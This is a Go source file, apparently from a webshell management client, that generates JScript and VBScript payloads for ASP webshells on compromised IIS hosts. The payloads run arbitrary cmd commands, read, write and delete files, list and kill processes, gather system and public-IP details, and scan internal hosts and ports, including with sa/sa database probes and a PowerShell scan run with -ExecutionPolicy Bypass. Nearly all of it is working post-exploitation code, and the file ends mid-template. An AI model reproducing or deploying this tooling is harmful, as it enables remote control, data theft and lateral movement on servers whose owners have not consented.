package shell

import (
	"context"
	"fmt"
	"strings"
)

// aspShell 是 ASP 类靶机的公共实现，asp（JScript）与 asp-vbs（VBScript）共用。
//
// 两者提交给靶机的脚本引擎不同（JScript vs VBScript），所以同一套能力有两套模板，
// 且字符串转义函数也不同（jsStr vs vbsStr）。这里用 vbs 字段区分，模板与转义统一在
// 方法内按 vbs 选择，避免每个能力函数里再写 `if o.Type == TypeAspVbs` 的二次分支。
type aspShell struct {
	vbs bool
}

func newAspJS() Shell  { return aspShell{vbs: false} }
func newAspVBS() Shell { return aspShell{vbs: true} }

func (a aspShell) Type() string {
	if a.vbs {
		return TypeAspVbs
	}
	return TypeAsp
}

// Run 执行系统命令：用 WScript.Shell.Exec 跑 cmd /c，把 stdout+stderr 夹在标记之间回显。
func (a aspShell) Run(ctx context.Context, o ExecOptions, cmd string) Result {
	cmd = strings.TrimSpace(cmd)
	start, end := marker(), marker()
	var payload string
	if a.vbs {
		payload = fmt.Sprintf(vbsCmdTmpl, vbsStr(start), vbsStr(end), vbsStr(cmd))
	} else {
		payload = fmt.Sprintf(aspCmdTmpl, jsStr(start), jsStr(end), jsStr(cmd))
	}
	return send(ctx, o, payload, start, end)
}

// Code 提交一段 JScript/VBScript 代码到 ASP 靶机，用于文件管理等结构化能力。
// 外层用 Response.Write 包住 start/end 标记；asp-vbs 必须用 VBScript 语法包裹，
// 否则整页编译失败 -> IIS 500（这就是此前所有 asp-vbs 能力页 500 的根因）。
func (a aspShell) Code(ctx context.Context, o ExecOptions, code string) Result {
	start, end := marker(), marker()
	var wrapper string
	if a.vbs {
		// 先切到 UTF-8 输出（CodePage=65001），否则中文 Windows 的 cmd 输出（GBK）回显到前端会乱码。
		wrapper = "Response.CodePage = 65001\nResponse.CharSet = \"utf-8\"\nResponse.Write " + vbsStr(start) + "\n" + code + "\nResponse.Write " + vbsStr(end)
	} else {
		wrapper = "Response.CodePage = 65001; Response.CharSet = \"utf-8\"; Response.Write(" + jsStr(start) + ");\n" + code + "\nResponse.Write(" + jsStr(end) + ");"
	}
	return send(ctx, o, wrapper, start, end)
}

// Probe 返回 Inspect 探测串：asp（JScript）用 // 注释；asp-vbs（VBScript）用 Rem 注释。
func (a aspShell) Probe() string {
	if a.vbs {
		return "Rem"
	}
	return "//"
}

// ---------- 结构化能力：按 vbs 选择模板与转义，返回靶机代码 ----------

func (a aspShell) FsList(dir string) (string, error) {
	if a.vbs {
		return strings.ReplaceAll(vbsFsList, "__DIR__", vbsStr(dir)), nil
	}
	return strings.ReplaceAll(aspFsList, "__DIR__", jsStr(dir)), nil
}

func (a aspShell) FsRead(path string) (string, error) {
	if a.vbs {
		return strings.ReplaceAll(vbsFsRead, "__PATH__", vbsStr(path)), nil
	}
	return strings.ReplaceAll(aspFsRead, "__PATH__", jsStr(path)), nil
}

func (a aspShell) FsWrite(path, b64 string) (string, error) {
	if a.vbs {
		return strings.ReplaceAll(strings.ReplaceAll(vbsFsWrite, "__PATH__", vbsStr(path)), "__B64__", vbsStr(b64)), nil
	}
	return strings.ReplaceAll(strings.ReplaceAll(aspFsWrite, "__PATH__", jsStr(path)), "__B64__", jsStr(b64)), nil
}

func (a aspShell) FsDelete(path string) (string, error) {
	if a.vbs {
		return strings.ReplaceAll(vbsFsDelete, "__PATH__", vbsStr(path)), nil
	}
	return strings.ReplaceAll(aspFsDelete, "__PATH__", jsStr(path)), nil
}

func (a aspShell) Monitor() (string, error) {
	if a.vbs {
		return vbsMonitor, nil
	}
	return aspMonitor, nil
}

func (a aspShell) ProcList() (string, error) {
	if a.vbs {
		return vbsProc, nil
	}
	return aspProc, nil
}

func (a aspShell) ProcKill(pid string, sig int) (string, error) {
	if a.vbs {
		return strings.ReplaceAll(strings.ReplaceAll(vbsProcKill,
			"__PID__", vbsStr(pid)), "__SIG__", fmt.Sprintf("%d", sig)), nil
	}
	return strings.ReplaceAll(strings.ReplaceAll(aspProcKill,
		"__PID__", jsStr(pid)), "__SIG__", fmt.Sprintf("%d", sig)), nil
}

func (a aspShell) PortsList() (string, error) {
	if a.vbs {
		return vbsPorts, nil
	}
	return aspPorts, nil
}

func (a aspShell) PortScan(host string, ports string) (string, error) {
	if a.vbs {
		return strings.ReplaceAll(strings.ReplaceAll(vbsPortScan,
			"__HOST__", vbsStr(host)), "__PORTS__", vbsStr(ports)), nil
	}
	return strings.ReplaceAll(strings.ReplaceAll(aspPortScan,
		"__HOST__", jsStr(host)), "__PORTS__", jsStr(ports)), nil
}

func (a aspShell) HostScan(hosts string, ports string, probe string) (string, error) {
	if a.vbs {
		return strings.ReplaceAll(strings.ReplaceAll(strings.ReplaceAll(vbsHostScan,
			"__HOSTS__", vbsStr(hosts)), "__PORTS__", vbsStr(ports)), "__PROBE__", vbsStr(probe)), nil
	}
	return strings.ReplaceAll(strings.ReplaceAll(strings.ReplaceAll(aspHostScan,
		"__HOSTS__", jsStr(hosts)), "__PORTS__", jsStr(ports)), "__PROBE__", jsStr(probe)), nil
}

func (a aspShell) PhpInfo() (string, error) {
	return "", fmt.Errorf("该操作仅支持 php-eval 类型靶机")
}

func (a aspShell) AspEnv() (string, error) {
	if a.vbs {
		return vbsEnv, nil
	}
	return aspEnv, nil
}

// ---------- ASP 靶机模板（靶机侧实际执行的 JScript / VBScript 代码） ----------

// aspCmdTmpl 是 ASP 命令执行的 JScript 骨架：%[1]s=start 标记，%[2]s=end 标记，%[3]s=命令（JS 字符串字面量）。
// 通过 WScript.Shell.Exec 跑 cmd /c，合并标准输出与标准错误，便于教学排错。
const aspCmdTmpl = `try {
  Response.CodePage = 65001;
  Response.CharSet = "utf-8";
  var ws = new ActiveXObject("WScript.Shell");
  var ec = ws.Exec("cmd /c " + %[3]s + " 2>&1");
  var out = "";
  while (!ec.StdOut.AtEndOfStream) { out += ec.StdOut.ReadLine() + "\n"; }
  while (!ec.StdErr.AtEndOfStream) { out += ec.StdErr.ReadLine() + "\n"; }
  Response.Write(%[1]s + out + %[2]s);
} catch (e) { Response.Write(%[1]s + "ERR:" + (e ? e.message : "") + %[2]s); }`

// vbsCmdTmpl 是 ASP 命令执行的 VBScript 骨架：%[1]s=start 标记，%[2]s=end 标记，%[3]s=命令（VBScript 字符串字面量）。
const vbsCmdTmpl = `On Error Resume Next
Response.CodePage = 65001
Response.CharSet = "utf-8"
Dim ws, ec, out
Set ws = CreateObject("WScript.Shell")
Set ec = ws.Exec("cmd /c " & %[3]s & " 2>&1")
out = ""
Do While Not ec.StdOut.AtEndOfStream
  out = out & ec.StdOut.ReadLine() & vbCrLf
Loop
Do While Not ec.StdErr.AtEndOfStream
  out = out & ec.StdErr.ReadLine() & vbCrLf
Loop
If Err.Number <> 0 Then
  Response.Write(%[1]s & "ERR:" & Err.Description & %[2]s)
Else
  Response.Write(%[1]s & out & %[2]s)
End If`

// vbsJPre / vbsJSuf 是内联的 VBScript JSON 字符串转义表达式前后缀。
// 注意：VBScript 的 Execute 不允许在被执行的代码里定义 Function/Sub，
// 且经典 ASP 的 VBScript 引擎不支持 IIf 函数（调用即 500），也常缺 IsNull，
// 所以这里改为在每处直接用 Replace(...Chr...) 内联转义，绝不定义过程、绝不用 IIf。
// 调用处写法为：vbsJPre + <表达式> + vbsJSuf。
// 其中 vbsJPre 先补上 JSON 字符串值的「开口双引号」再打开转义函数，
// vbsJSuf 关闭转义函数并补上 JSON 字符串值的「闭合双引号」。
// 模板里只写 `"key":`（冒号后不写引号），开口/闭合引号都由这里统一补，
// 避免每处模板都手写引号、也避免 VBScript 把模板末尾的 `"` 误当作字符串字面量闭合符。
// 注意 VBScript 表示一个字面量 `"` 需要四个引号 `""""`（三引号 `"""` 会被当成未闭合字符串而编译失败）。
// 由于 WMI 文本字段可能为 NULL，调用方需保证传入的表达式是非 NULL 字符串
// （例如先 `s = "": s = CStr(field)`，On Error Resume Next 会把 NULL 的 CStr 错误吞掉，s 保持 ""）。
const vbsJPre = `"""" & Replace(Replace(Replace(CStr(`
const vbsJSuf = `), Chr(92), Chr(92) & Chr(92)), Chr(34), Chr(92) & Chr(34)), vbCrLf, Chr(10)) & """"`

const vbsFsList = `On Error Resume Next
Dim fs, f, it, arr
Set fs = CreateObject("Scripting.FileSystemObject")
Set f = fs.GetFolder(__DIR__)
If Err.Number <> 0 Then
  Response.Write("{""ok"":false,""error"":" & ` + vbsJPre + `Err.Description` + vbsJSuf + ` & "}")
Else
  arr = ""
  For Each it In f.Files
    arr = arr & ",{""name"":" & ` + vbsJPre + `it.Name` + vbsJSuf + ` & ",""path"":" & ` + vbsJPre + `it.Path` + vbsJSuf + ` & ",""isDir"":false,""size"":" & CStr(it.Size) & ",""mode"":""""}"
  Next
  For Each it In f.SubFolders
    arr = arr & ",{""name"":" & ` + vbsJPre + `it.Name` + vbsJSuf + ` & ",""path"":" & ` + vbsJPre + `it.Path` + vbsJSuf + ` & ",""isDir"":true,""size"":0,""mode"":""""}"
  Next
  If Len(arr) > 0 Then arr = Mid(arr, 2)
  Response.Write("{""ok"":true,""dir"":" & ` + vbsJPre + `f.Path` + vbsJSuf + ` & ",""entries"":[" & arr & "]}")
End If`

const vbsFsRead = `On Error Resume Next
Dim fs, f, name, size, stream, xml, node, bin
Set fs = CreateObject("Scripting.FileSystemObject")
Set f = fs.GetFile(__PATH__)
If Err.Number <> 0 Then
  Response.Write("{""ok"":false,""error"":" & ` + vbsJPre + `Err.Description` + vbsJSuf + ` & "}")
Else
  name = f.Name: size = f.Size
  Set stream = CreateObject("ADODB.Stream")
  stream.Type = 1: stream.Open: stream.LoadFromFile __PATH__: bin = stream.Read: stream.Close
  If Err.Number <> 0 Then
    Response.Write("{""ok"":false,""error"":" & ` + vbsJPre + `Err.Description` + vbsJSuf + ` & "}")
  Else
    Set xml = CreateObject("MSXML2.DOMDocument")
    Set node = xml.createElement("b64")
    node.dataType = "bin.base64"
    node.nodeTypedValue = bin
    If Err.Number <> 0 Then
      Response.Write("{""ok"":false,""error"":" & ` + vbsJPre + `Err.Description` + vbsJSuf + ` & "}")
    Else
      Dim b64: b64 = node.text
      ' NOTE: MSXML bin.base64 wraps lines; strip them or the JSON string is invalid.
      ' Keep this comment ASCII-only: non-ASCII bytes in the payload confuse the ASP VBScript lexer.
      b64 = Replace(Replace(Replace(b64, vbCrLf, ""), vbCr, ""), vbLf, "")
      Response.Write("{""ok"":true,""name"":" & ` + vbsJPre + `name` + vbsJSuf + ` & ",""size"":" & CStr(size) & ",""base64"":" & ` + vbsJPre + `b64` + vbsJSuf + ` & "}")
    End If
  End If
End If`

const vbsFsWrite = `On Error Resume Next
Dim xml, node, bin, stream
Set xml = CreateObject("MSXML2.DOMDocument")
Set node = xml.createElement("b64")
node.dataType = "bin.base64"
node.text = __B64__
bin = node.nodeTypedValue
Set stream = CreateObject("ADODB.Stream")
stream.Type = 1: stream.Open: stream.Write bin: stream.SaveToFile __PATH__, 2: stream.Close
If Err.Number <> 0 Then
  Response.Write("{""ok"":false,""error"":" & ` + vbsJPre + `Err.Description` + vbsJSuf + ` & "}")
Else
  Response.Write("{""ok"":true,""bytes"":" & CStr(LenB(bin)) & "}")
End If`

const vbsFsDelete = `On Error Resume Next
Dim fs
Set fs = CreateObject("Scripting.FileSystemObject")
If fs.FileExists(__PATH__) Then
  fs.DeleteFile __PATH__
ElseIf fs.FolderExists(__PATH__) Then
  fs.DeleteFolder __PATH__
End If
If Err.Number <> 0 Then
  Response.Write("{""ok"":false,""error"":" & ` + vbsJPre + `Err.Description` + vbsJSuf + ` & "}")
Else
  Response.Write("{""ok"":true}")
End If`

const vbsProcKill = `On Error Resume Next
Dim force, ws, ec, out, ok, args
force = (__SIG__ = 9)
Set ws = CreateObject("WScript.Shell")
args = " /PID " & __PID__
If force Then args = args & " /F"
Set ec = ws.Exec("cmd /c taskkill" & args & " 2>&1")
out = ""
Do While Not ec.StdOut.AtEndOfStream: out = out & ec.StdOut.ReadLine() & vbCrLf: Loop
Do While Not ec.StdErr.AtEndOfStream: out = out & ec.StdErr.ReadLine() & vbCrLf: Loop
ok = (InStr(1, out, "SUCCESS", 1) > 0)
If Err.Number <> 0 Then
  Response.Write("{""ok"":false,""error"":" & ` + vbsJPre + `Err.Description` + vbsJSuf + ` & "}")
Else
  If ok Then
    Response.Write("{""ok"":true,""error"":" & ` + vbsJPre + `Trim(out)` + vbsJSuf + ` & "}")
  Else
    Response.Write("{""ok"":false,""error"":" & ` + vbsJPre + `Trim(out)` + vbsJSuf + ` & "}")
  End If
End If`

const vbsMonitor = `On Error Resume Next
Dim wmi, host, oscap, upsec, cs, e, os, mt, mf, cores, model, cpus, c, pu, dq, d, total, free, disks, json, fs, mnt, uptime, use
host = "": oscap = "": upsec = Null
Set wmi = GetObject("winmgmts:\\.\root\cimv2")
Set cs = wmi.ExecQuery("SELECT Name FROM Win32_ComputerSystem")
For Each e In cs: host = CStr(e.Name): Next
Set os = wmi.ExecQuery("SELECT Caption,TotalVisibleMemorySize,FreePhysicalMemory,LastBootUpTime FROM Win32_OperatingSystem")
mt = 0: mf = 0
For Each e In os
  oscap = CStr(e.Caption)
  mt = CDbl(e.TotalVisibleMemorySize) * 1024
  mf = CDbl(e.FreePhysicalMemory) * 1024
  upsec = DateDiff("s", DateSerial(CInt(Mid(e.LastBootUpTime,1,4)), CInt(Mid(e.LastBootUpTime,5,2)), CInt(Mid(e.LastBootUpTime,7,2))) + TimeSerial(CInt(Mid(e.LastBootUpTime,9,2)), CInt(Mid(e.LastBootUpTime,11,2)), CInt(Mid(e.LastBootUpTime,13,2))), Now())
Next
cores = 0: model = ""
Set cpus = wmi.ExecQuery("SELECT Name,NumberOfLogicalProcessors,NumberOfCores FROM Win32_Processor")
For Each c In cpus
  cores = cores + CInt(c.NumberOfLogicalProcessors)
  If cores = 0 Then cores = cores + CInt(c.NumberOfCores)
  If model = "" Then model = c.Name
Next
If cores = 0 Then cores = 1
pu = 0
Set q = wmi.ExecQuery("SELECT PercentProcessorTime FROM Win32_PerfFormattedData_PerfOS_Processor WHERE Name='_Total'")
For Each e In q: pu = e.PercentProcessorTime: Next
uptime = "": If Not IsNull(upsec) Then uptime = CStr(upsec)
disks = ""
Set dq = wmi.ExecQuery("SELECT DeviceID,Size,FreeSpace,FileSystem FROM Win32_LogicalDisk WHERE DriveType=3")
For Each d In dq
  total = CDbl(d.Size): free = CDbl(d.FreeSpace)
  fs = "": fs = CStr(d.FileSystem)
  mnt = "": mnt = CStr(d.DeviceID & "\")
  use = 0
  If total > 0 Then use = CInt((total - free) / total * 100)
  disks = disks & ",{""fs"":" & ` + vbsJPre + `fs` + vbsJSuf + ` & ",""total"":" & CStr(total) & ",""used"":" & CStr(total - free) & ",""avail"":" & CStr(free) & ",""use"":" & CStr(use) & ",""mount"":" & ` + vbsJPre + `mnt` + vbsJSuf + ` & "}"
Next
If Len(disks) > 0 Then disks = Mid(disks, 2)
' 网络地址：内网 IP（非回环 / 非链路本地）与公网 IP（出网探测）
intIPs = ""
Set ncQ = wmi.ExecQuery("SELECT IPAddress FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
For Each nc In ncQ
  If Not IsNull(nc.IPAddress) Then
    For Each a In nc.IPAddress
      If Not IsNull(a) Then
        If InStr(a, ":") = 0 And Left(a, 3) <> "127" And Left(a, 7) <> "169.254" Then
          If intIPs = "" Then intIPs = a Else intIPs = intIPs & "," & a
        End If
      End If
    Next
  End If
Next
intIPjson = ""
If intIPs <> "" Then
  aArr = Split(intIPs, ",")
  For ai = 0 To UBound(aArr)
    intIPjson = intIPjson & "," & """" & aArr(ai) & """"
  Next
  If Len(intIPjson) > 0 Then intIPjson = Mid(intIPjson, 2)
End If
pubIP = ""
On Error Resume Next
Set xh = CreateObject("WinHttp.WinHttpRequest.5.1")
If Err.Number = 0 Then
  ' 启用 TLS 1.2：老系统 WinHttpRequest 默认只到 TLS 1.0，连不上现代 HTTPS 站点
  xh.Option(9) = 2720
  Err.Clear
  xh.SetTimeouts 5000, 5000, 5000, 5000
  ' 优先 cip.cc（多行文本，含 "IP : x.x.x.x"），失败回退 icanhazip.com / ipconfig.io（纯 IP）
  xh.Open "GET", "https://cip.cc", False
  xh.Send
  If Err.Number = 0 Then
    pubTxt = xh.ResponseText
    pubTxt = Replace(pubTxt, vbCrLf, vbLf)
    pubTxt = Replace(pubTxt, vbCr, vbLf)
    pubLines = Split(pubTxt, vbLf)
    For Each pl In pubLines
      If UCase(Left(pl, 2)) = "IP" Then
        cpos = InStr(pl, ":")
        If cpos > 0 Then
          pubIP = Trim(Mid(pl, cpos + 1))
          If pubIP <> "" Then Exit For
        End If
      End If
    Next
    ' 含空白 / HTML / 超长视为无效解析，交给其余 URL 兜底
    If pubIP <> "" Then
      If InStr(pubIP, " ") > 0 Or InStr(pubIP, "<") > 0 Or Len(pubIP) > 45 Then pubIP = ""
    End If
  End If
  If pubIP = "" Then
    Err.Clear
    Set xh2 = CreateObject("WinHttp.WinHttpRequest.5.1")
    If Err.Number = 0 Then
      xh2.Option(9) = 2720
      Err.Clear
      xh2.SetTimeouts 5000, 5000, 5000, 5000
      xh2.Open "GET", "https://icanhazip.com", False
      xh2.Send
      If Err.Number = 0 Then pubIP = Trim(xh2.ResponseText)
    End If
  End If
  If pubIP = "" Then
    Err.Clear
    Set xh3 = CreateObject("WinHttp.WinHttpRequest.5.1")
    If Err.Number = 0 Then
      xh3.Option(9) = 2720
      Err.Clear
      xh3.SetTimeouts 5000, 5000, 5000, 5000
      xh3.Open "GET", "https://ipconfig.io", False
      xh3.Send
      If Err.Number = 0 Then pubIP = Trim(xh3.ResponseText)
    End If
  End If
End If
' VBScript 的 Trim 不去换行，外部 IP 服务返回常带 CRLF，必须显式剥离，否则会污染 JSON 导致解析失败
pubIP = Replace(Replace(pubIP, vbCr, ""), vbLf, "")
json = "{""ok"":true,""hostname"":" & """" & host & """" & ",""os"":" & """" & oscap & """" & ",""uptime"":" & uptime & ",""loadavg"":[],""cpu"":{""cores"":" & CStr(cores) & ",""model"":" & """" & model & """" & ",""usage"":" & CStr(pu / 100) & "},""mem"":{""MemTotal"":" & CStr(mt) & ",""MemAvailable"":" & CStr(mf) & "},""disks"":[" & disks & "],""intIPs"":[" & intIPjson & "],""pubIP"":" & """" & pubIP & """" & "}"
Response.Write(json)`

const vbsProc = `On Error Resume Next
Dim wmi, totalBytes, os, e, q, p, owner, dom, user, ws, memPct, procs
Set wmi = GetObject("winmgmts:\\.\root\cimv2")
totalBytes = 0
Set os = wmi.ExecQuery("SELECT TotalVisibleMemorySize FROM Win32_OperatingSystem")
For Each e In os: totalBytes = CLng(e.TotalVisibleMemorySize) * 1024: Next
procs = ""
Set q = wmi.ExecQuery("SELECT ProcessId,ParentProcessId,Name,CommandLine,WorkingSetSize FROM Win32_Process")
For Each p In q
  owner = ""
  dom = "": user = ""
  If p.GetOwner(user, dom) = 0 Then
    If dom <> "" Then owner = dom & "\" & user Else owner = user
  End If
  pid = 0: If Not IsNull(p.ProcessId) Then pid = p.ProcessId
  ppid = 0: If Not IsNull(p.ParentProcessId) Then ppid = p.ParentProcessId
  ws = 0: If Not IsNull(p.WorkingSetSize) Then ws = CLng(p.WorkingSetSize)
  memPct = 0
  If totalBytes > 0 Then memPct = Round(ws / totalBytes * 100, 1)
  cmd = "": cmd = CStr(p.Name)
  If Not IsNull(p.CommandLine) Then
    If p.CommandLine <> "" Then cmd = p.CommandLine
  End If
  procs = procs & ",{""pid"":" & CStr(pid) & ",""ppid"":" & CStr(ppid) & ",""user"":" & ` + vbsJPre + `owner` + vbsJSuf + ` & ",""cpu"":0,""mem"":" & CStr(memPct) & ",""cmd"":" & ` + vbsJPre + `cmd` + vbsJSuf + ` & "}"
Next
If Len(procs) > 0 Then procs = Mid(procs, 2)
Response.Write("{""ok"":true,""procs"":[" & procs & "]}")`

const vbsPorts = `On Error Resume Next
Dim ws, ec, out, lines, i, ln, parts, local, idx, addr, port, pid, ports
Set ws = CreateObject("WScript.Shell")
Set ec = ws.Exec("cmd /c netstat -ano 2>&1")
out = ""
Do While Not ec.StdOut.AtEndOfStream: out = out & ec.StdOut.ReadLine() & vbCrLf: Loop
Do While Not ec.StdErr.AtEndOfStream: out = out & ec.StdErr.ReadLine() & vbCrLf: Loop
lines = Split(out, vbCrLf)
ports = ""
For i = 0 To UBound(lines)
  ln = Trim(lines(i))
  If ln <> "" Then
    Do While InStr(ln, "  ") > 0: ln = Replace(ln, "  ", " "): Loop
    parts = Split(ln, " ")
    If UBound(parts) >= 4 Then
      If UCase(parts(0)) = "TCP" Then
        If UCase(parts(3)) = "LISTENING" Then
          local = parts(1): pid = parts(4)
          idx = InStrRev(local, ":")
          addr = Mid(local, 1, idx - 1)
          addr = Replace(Replace(addr, "[", ""), "]", "")
          port = CInt(Mid(local, idx + 1))
          ports = ports & ",{""proto"":""tcp"",""addr"":" & ` + vbsJPre + `addr` + vbsJSuf + ` & ",""port"":" & CStr(port) & ",""inode"":"""",""pid"":" & ` + vbsJPre + `pid` + vbsJSuf + ` & ",""comm"":""""}"
        End If
      End If
    End If
  End If
Next
If Len(ports) > 0 Then ports = Mid(ports, 2)
Response.Write("{""ok"":true,""ports"":[" & ports & "]}")`

const vbsPortScan = `On Error Resume Next
Dim host, ports, arr, i, port, results, r, openStr, st, hasAdo, c, d, okAdo, ws, ec, out, ps, usePs, http, code, ok, adoUsable, calDesc
host = __HOST__
ports = __PORTS__
st = Timer
' ADODB 探测：先用必然关闭的 127.0.0.1:1 做校准，确认 SQLOLEDB provider 真实可用。
' provider 缺失时 c.Open 对所有端口都返回同一个 "Provider cannot be found..."，与端口状态无关；
' 若不校准，该错误会被下面的启发式当成"应用层错误"误判为开放，导致全部端口都显示开放。
hasAdo = False
adoUsable = False
Set c = CreateObject("ADODB.Connection")
If Err.Number = 0 Then hasAdo = True
Err.Clear
If hasAdo Then
  Set c = CreateObject("ADODB.Connection")
  c.ConnectionTimeout = 1
  c.CommandTimeout = 1
  Err.Clear
  c.Open "Provider=SQLOLEDB;Data Source=127.0.0.1,1;User ID=sa;Password=sa;Connect Timeout=1;"
  calDesc = LCase(CStr(Err.Description))
  ' 端口 1 必然关闭：必须产生网络层错误才说明 provider 可用；
  ' 若报 provider 缺失/未注册，则不可用，放弃 ADO 交由 PowerShell / WinHttp
  If Err.Number <> 0 Then
    If InStr(calDesc, "provider") = 0 And InStr(calDesc, "not registered") = 0 And InStr(calDesc, "cannot be found") = 0 Then
      adoUsable = True
    End If
  End If
  c.Close
  Err.Clear
End If
If adoUsable Then
  arr = Split(ports, ",")
  results = ""
  For i = 0 To UBound(arr)
    port = Trim(arr(i))
    If port <> "" Then
      okAdo = False
      Set c = CreateObject("ADODB.Connection")
      c.ConnectionTimeout = 2
      c.CommandTimeout = 2
      c.Open "Provider=SQLOLEDB;Data Source=" & host & "," & port & ";User ID=sa;Password=sa;Connect Timeout=2;"
      If Err.Number = 0 Then
        okAdo = True
      Else
        d = LCase(CStr(Err.Description))
        ' 端口开放：TCP 已建立，报错多为应用层（登录失败/密码错/协议/SSL）；关闭或不可达：网络层错误
        If InStr(d, "does not exist") > 0 Or InStr(d, "refused") > 0 Or InStr(d, "network-related") > 0 Or InStr(d, "timed out") > 0 Or InStr(d, "timeout expired") > 0 Or InStr(d, "could not open a connection") > 0 Then
          okAdo = False
        Else
          okAdo = True
        End If
      End If
      c.Close
      Err.Clear
      If okAdo Then openStr = "true" Else openStr = "false"
      r = "{""port"":" & port & ",""open"":" & openStr & "}"
      results = results & "," & r
    End If
    ' 总时长预算：ADO 对不可达/被过滤主机可能阻塞远超 Connect Timeout（WinHttp 有硬上限，ADO 没有），
    ' 超预算立即停止探测并返回已有结果，避免靶机脚本执行过久导致 Go 侧 context 超时。
    ' 30s 覆盖「校准 1s + 12 端口 × 最坏 2s」，且远低于 Go 侧每批 52s 的超时
    If Timer - st > 30 Then Exit For
  Next
  If Len(results) > 0 Then results = Mid(results, 2)
  Response.Write("{""ok"":true,""host"":" & """" & host & """" & ",""ports"":[" & results & "],""elapsed"":" & CStr(Timer - st) & "}")
Else
  ' 退化：PowerShell 原始 TCP（失败再退化到 WinHttp）
  usePs = False
  Set ws = CreateObject("WScript.Shell")
  If Err.Number = 0 Then
    ps = "$h='" & host & "';$ps='" & ports & "'.Split(',');$r=@();foreach($p in $ps){$p=$p.Trim();if($p-ne''){$t=New-Object System.Net.Sockets.TcpClient;$ar=$t.BeginConnect($h,[int]$p,$null,$null);$ok=$ar.AsyncWaitHandle.WaitOne(1500);$open=$false;try{if($ok){$t.EndConnect($ar);$open=$true}}catch{$open=$false}finally{try{$t.Close()}catch{}}$r+=@{port=[int]$p;open=$open}}};@{ok=$true;host=$h;ports=$r;elapsed=0}|ConvertTo-Json -Compress -Depth 4"
    Err.Clear
    Set ec = ws.Exec("powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -WarningAction SilentlyContinue -Command """ & ps & """")
    out = ""
    Do While Not ec.StdOut.AtEndOfStream: out = out & ec.StdOut.ReadLine() & vbCrLf: Loop
    If Left(Trim(out), 1) = "{" Then
      usePs = True
      Response.Write(Replace(Trim(out), """elapsed"":0", """elapsed"":" & CStr(Timer - st)))
    End If
  End If
  If Not usePs Then
    arr = Split(ports, ",")
    results = ""
    For i = 0 To UBound(arr)
      port = Trim(arr(i))
      If port <> "" Then
        ok = False
        Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
        If Err.Number = 0 Then
          On Error Resume Next
          http.SetTimeouts 2000, 2000, 2000, 2000
          http.Open "GET", "http://" & host & ":" & port & "/", False
          http.Send
          code = Err.Number
          ' 仅拒绝连接(-2147012867)/超时(-2147012894)/域名无法解析(-2147012889)判为关闭
          If code = 0 Then
            ok = True
          ElseIf code = -2147012867 Or code = -2147012894 Or code = -2147012889 Then ok = False
          Else ok = True
          End If
        End If
        If ok Then openStr = "true" Else openStr = "false"
        r = "{""port"":" & port & ",""open"":" & openStr & "}"
        results = results & "," & r
      End If
    Next
    If Len(results) > 0 Then results = Mid(results, 2)
    Response.Write("{""ok"":true,""host"":" & """" & host & """" & ",""ports"":[" & results & "],""elapsed"":" & CStr(Timer - st) & "}")
  End If
End If`

const vbsEnv = `On Error Resume Next
Dim ver, server, docRoot, wmi, osQ, e, o, aWS, aFSO, aADO, aDict, aMSXML, aWNet, comps, list, bWS, bFSO, bADO, bDict, bMSXML, bWNet, sep
ver = CStr(ScriptEngineMajorVersion()) & "." & CStr(ScriptEngineMinorVersion()) & " (" & ScriptEngine() & ")"
server = CStr(Request.ServerVariables("SERVER_SOFTWARE"))
docRoot = CStr(Request.ServerVariables("APPL_PHYSICAL_PATH"))
os = ""
Set wmi = GetObject("winmgmts:\\.\root\cimv2")
Set osQ = wmi.ExecQuery("SELECT Caption FROM Win32_OperatingSystem")
For Each e In osQ: os = CStr(e.Caption): Next
On Error Resume Next
Set o = CreateObject("WScript.Shell"): aWS = (Err.Number = 0): Err.Clear
Set o = CreateObject("Scripting.FileSystemObject"): aFSO = (Err.Number = 0): Err.Clear
Set o = CreateObject("ADODB.Stream"): aADO = (Err.Number = 0): Err.Clear
Set o = CreateObject("Scripting.Dictionary"): aDict = (Err.Number = 0): Err.Clear
Set o = CreateObject("MSXML2.DOMDocument"): aMSXML = (Err.Number = 0): Err.Clear
Set o = CreateObject("WScript.Network"): aWNet = (Err.Number = 0): Err.Clear
bWS = "false": If aWS Then bWS = "true"
bFSO = "false": If aFSO Then bFSO = "true"
bADO = "false": If aADO Then bADO = "true"
bDict = "false": If aDict Then bDict = "true"
bMSXML = "false": If aMSXML Then bMSXML = "true"
bWNet = "false": If aWNet Then bWNet = "true"
comps = """WScript.Shell"":" & bWS & ",""Scripting.FileSystemObject"":" & bFSO & ",""ADODB.Stream"":" & bADO & ",""Scripting.Dictionary"":" & bDict & ",""MSXML2.DOMDocument"":" & bMSXML & ",""WScript.Network"":" & bWNet
list = ""
If aWS Then list = list & """WScript.Shell"""
If aFSO Then
  sep = "": If list <> "" Then sep = ","
  list = list & sep & """Scripting.FileSystemObject"""
End If
If aADO Then
  sep = "": If list <> "" Then sep = ","
  list = list & sep & """ADODB.Stream"""
End If
If aDict Then
  sep = "": If list <> "" Then sep = ","
  list = list & sep & """Scripting.Dictionary"""
End If
If aMSXML Then
  sep = "": If list <> "" Then sep = ","
  list = list & sep & """MSXML2.DOMDocument"""
End If
If aWNet Then
  sep = "": If list <> "" Then sep = ","
  list = list & sep & """WScript.Network"""
End If
Response.Write("{""kind"":""asp"",""ok"":true,""engine"":" & ` + vbsJPre + `ver` + vbsJSuf + ` & ",""serverSoftware"":" & ` + vbsJPre + `server` + vbsJSuf + ` & ",""docRoot"":" & ` + vbsJPre + `docRoot` + vbsJSuf + ` & ",""os"":" & ` + vbsJPre + `os` + vbsJSuf + ` & ",""anyExec"":" & bWS & ",""execComponents"":{" & comps & "},""components"":[" & list & "]}")`

const aspFsList = `try {
  var fs = new ActiveXObject("Scripting.FileSystemObject");
  var f = fs.GetFolder(__DIR__);
  var arr = [];
  for (var e = new Enumerator(f.Files); !e.atEnd(); e.moveNext()) {
    var it = e.item();
    arr.push({ name: it.Name, path: it.Path, isDir: false, size: it.Size, mode: "" });
  }
  for (var e = new Enumerator(f.SubFolders); !e.atEnd(); e.moveNext()) {
    var it = e.item();
    arr.push({ name: it.Name, path: it.Path, isDir: true, size: 0, mode: "" });
  }
  Response.Write(JSON.stringify({ ok: true, dir: f.Path, entries: arr }));
} catch (e) { Response.Write(JSON.stringify({ ok: false, error: (e ? e.message : "") })); }`

const aspFsRead = `try {
  var fs = new ActiveXObject("Scripting.FileSystemObject");
  var f = fs.GetFile(__PATH__);
  var name = f.Name, size = f.Size;
  var stream = new ActiveXObject("ADODB.Stream");
